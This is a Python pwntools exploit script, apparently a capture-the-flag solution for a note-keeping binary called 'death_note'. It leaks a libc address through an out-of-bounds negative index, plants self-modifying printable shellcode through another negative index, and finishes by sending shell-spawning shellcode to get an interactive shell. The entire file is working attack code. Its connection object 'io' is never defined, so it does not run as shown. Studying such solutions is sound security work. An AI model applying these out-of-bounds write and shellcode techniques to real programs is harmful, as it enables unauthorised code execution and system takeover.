from pwn import *
#io = process('./death_note')
context.log_level = 'debug'
pause()
def add_note(idx, name):
    io.recvuntil('Your choice :')
    io.sendline('1')
    io.recvuntil('Index :')
    io.sendline(str(idx))
    io.recvuntil('Name :')
    io.sendline(name)

#use show(stdout) to leak libc
def leak_libc(idx):
    io.recvuntil('Your choice :')
    io.sendline('2')
    io.recvuntil('Index :')
    io.sendline(str(idx))

def free_note(idx):
    io.recvuntil('Your choice :')
    io.sendline('3')
    io.recvuntil('Index :')
    io.sendline(str(idx))

#because of jbe implies signed, and jle doesnt implies signed
#so we cant puts characters greater than 0x80
leak_libc(-7)
io.recvuntil('Name : ')
io.recvn(4)
libc_addr = u32(io.recvn(4))
log.info('libc_addr :' + hex(libc_addr))
libc_main = libc_addr - 0xf770aec7 + 0xf7553000
log.info('libc_main :' + hex(libc_main))

pause()
buf = ''
buf += asm('pop ecx') # ecx = 0x8048878
buf += asm('pop eax') # eax = heap addr
buf += asm('push 0x70')
buf += asm('pop ebx')
buf += asm('sub byte ptr[eax+0x3f], bl') 

buf += asm('push 0x50') #read_num
buf += asm('push esp') 
buf += asm('pop eax')
buf += asm('push eax') #read into stack
buf += asm('push eax') #ret_addr
buf += asm('push ecx') #call read_input

#make ecx = read_input 0x804862b
buf += asm('push esp') # stack addr
buf += asm('pop eax') # eax = stack addr
buf += asm ('push 0x30303033') 
buf += asm('pop esi')
buf += asm ('xor word ptr[eax], si') 
buf += asm ('push 0x30303220')
buf += asm('pop esi')
buf += asm('sub word ptr[eax], si')
#(0x97d4038 - 0x97d4018)
buf = buf.ljust(0x2f, '<')
buf += '\x33' #will be edited to ret

add_note(0, '/bin/sh')
add_note(-19, buf)
free_note(0)

io.sendline(asm(shellcraft.i386.linux.sh()))
io.interactive()
